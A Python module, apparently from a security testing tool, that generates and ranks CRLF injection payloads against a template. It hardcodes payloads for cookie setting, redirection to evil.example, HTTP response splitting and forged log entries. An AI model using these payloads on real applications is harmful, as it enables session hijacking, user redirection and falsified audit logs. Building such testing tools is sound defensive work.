"""CRLF injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, CrlfKind, Risk
from .context import analyze_crlf_context

_HEADER_BODIES = [
    ("\r\nSet-Cookie: injected=1", "set-cookie"),
    ("\r\nLocation: https://evil.example", "location-redirect"),
    ("\r\nX-Injected: 1", "custom-header"),
    ("\r\n\r\n<html>injected body</html>", "response-splitting"),
    ("%0d%0aSet-Cookie: injected=1", "encoded-set-cookie"),
    ("\nSet-Cookie: injected=1", "bare-lf"),
]

_LOG_BODIES = [
    ("\n[ERROR] forged log entry", "forged-entry"),
    ("\nadmin authenticated successfully", "forged-auth"),
    ("%0a[ERROR] forged log entry", "encoded-forged"),
    ("\r\n[WARN] injected", "crlf-entry"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class CrlfCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class CrlfMutationResult:
    template: str
    kind: CrlfKind
    context: Context
    generated: int
    valid: int
    candidates: list[CrlfCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "kind": self.kind.value,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def mutate_crlf(template: str, kind: CrlfKind = CrlfKind.HEADER) -> CrlfMutationResult:
    """Generate and rank CRLF injection payloads for ``template``."""
    from .analyzer import analyze_crlf

    context = analyze_crlf_context(template, kind)
    bodies = _HEADER_BODIES if kind == CrlfKind.HEADER else _LOG_BODIES

    candidates: list[CrlfCandidate] = []
    for payload, strategy in bodies:
        result = analyze_crlf(template, payload, kind)
        b = result.breakout
        if b.command_injected or "encoded" in b.separators:
            candidates.append(
                CrlfCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=b.command_injected,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return CrlfMutationResult(
        template=template,
        kind=kind,
        context=context,
        generated=len(bodies),
        valid=len(candidates),
        candidates=candidates,
    )
